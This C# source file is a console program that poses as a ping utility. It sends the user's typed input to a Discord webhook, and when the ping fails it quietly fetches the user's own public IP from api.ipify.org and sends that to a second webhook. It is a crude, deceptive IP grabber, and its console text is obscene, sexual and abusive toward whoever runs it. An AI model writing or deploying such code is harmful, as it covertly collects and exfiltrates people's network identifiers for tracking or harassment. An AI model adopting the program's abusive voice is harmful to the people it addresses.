using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;



namespace C_
{
    class Program
    {
        private static string GetIp()
        {
            using (WebClient c = new WebClient())
            {
                string ip = c.DownloadString("https://api.ipify.org/");
                return ip;
            }
        }        
        public static void Main(string[] args)
        {
            Console.Title = "I am shitting inside a toilet";
            Console.ForegroundColor = ConsoleColor.Green;

            string userInput;

            Console.WriteLine("Hello Bitch tell me your ip address");


            userInput = Console.ReadLine();

            String WH = "Webhook 1";
            string WH2 = "Webhook 2";
            
            string Message2 = "I took it up the ass for this: " + GetIp(); 
            

            try
            {
               Ping myPing = new Ping();
               PingReply reply = myPing.Send(userInput,1000);
               if (reply != null){
                   Console.Clear();
                   Console.WriteLine("Status :  " + reply.Status + " \n Time : " + reply.RoundtripTime.ToString() + " \n Address : " + reply.Address);
                   Console.WriteLine("HAHAHAHA");

                   for(int timeThing = 10; timeThing > 0;timeThing--){
                     System.Threading.Thread.Sleep(500);
                   } 
                    Console.Clear();
                    Console.WriteLine("Now sending to data vault");
                    Console.WriteLine("░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░");
                    Console.WriteLine("░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░");
                    Console.WriteLine("░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░");
                    Console.WriteLine("░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░");
                    Console.WriteLine("░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░");
                    Console.WriteLine("█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█");
                    Console.WriteLine("█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█");
                    Console.WriteLine("░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░");
                    Console.WriteLine("░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░");
                    Console.WriteLine("░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░");
                    Console.WriteLine("░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░");
                    Console.WriteLine("░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░");
                    Console.WriteLine("░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░");
                    Console.WriteLine("░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░");
                    Console.WriteLine("░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░");
                    System.Threading.Thread.Sleep(1000);
                    Console.Clear();

                    for(int timeThing = 4; timeThing > 0;timeThing--){
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        System.Threading.Thread.Sleep(300);
                        Console.Write(".");
                        Console.Clear();
                    }

                    String Message = "Daddy I sucked this Ip out of a guys cock: " + userInput;

                    Discord.REQ.WebHoock.Send(Message, WH, null);
                    Console.Write("<--------Done-------->");
                    System.Threading.Thread.Sleep(300); 
                    System.Environment.Exit(1);                   
               } else {
                   Console.WriteLine("Shit's broken, are you poor?");
               }
           } 
           catch 
           {
               string Message = "They said this weird shit daddy: " + userInput;
               Console.WriteLine("You're a fuckin pussy ass bitch!!!! Don't worry tho I still got your IP");
               Discord.REQ.WebHoock.Send(Message2, WH2, null);
               Discord.REQ.WebHoock.Send(Message, WH, null);
           }
           
            System.Threading.Thread.Sleep(300); 
            System.Environment.Exit(1);
        }
    }
}
